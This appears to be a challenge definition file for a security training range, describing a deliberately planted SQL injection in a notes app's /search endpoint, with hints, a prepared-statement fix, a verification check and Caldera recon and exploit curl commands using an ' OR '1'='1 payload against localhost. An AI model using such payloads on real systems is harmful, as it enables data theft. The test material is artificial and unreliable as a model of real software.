@@ -1,0 +1,33 @@
+id: notes_sqli
+name: SQL Injection in Notes Search
+description: The /search endpoint builds SQL queries by concatenating user input directly, enabling classic SQL injection attacks.
+type: vulnerability
+difficulty: hard
+points: 300
+category: web
+tags: [sqli, web, nodejs, injection]
+conflicts: []
+requires: [notes_api]
+script: notes_sqli.sh
+verification:
+  type: file_not_contains
+  path: /opt/notesapi/app.js
+  pattern: "+ req.query"
+suggested_fix: "Replace the raw string concatenation in /search with a parameterised query using better-sqlite3 prepared statements: db.prepare('SELECT * FROM notes WHERE body LIKE ?').all('%' + term + '%')"
+hints:
+  - "Review the /search endpoint for unsafe input handling"
+  - "Look at how the search query is constructed in /opt/notesapi/app.js"
+  - "Replace string concatenation with a prepared statement: db.prepare('SELECT * FROM notes WHERE body LIKE ?').all(term)"
+caldera:
+  tactic: initial-access
+  technique:
+    attack_id: T1190
+    name: "Exploit Public-Facing Application"
+  recon:
+    description: "Check if the /search endpoint is vulnerable to SQL injection"
+    command: |
+      curl -s "http://localhost:3000/search?q=' OR '1'='1" | grep -q "note" && echo "VULNERABLE: SQL injection in /search" || echo "SECURE: /search appears safe"
+  exploit:
+    description: "Dump all notes via SQL injection"
+    command: |
+      curl -s "http://localhost:3000/search?q=' OR '1'='1'--" | python3 -m json.tool
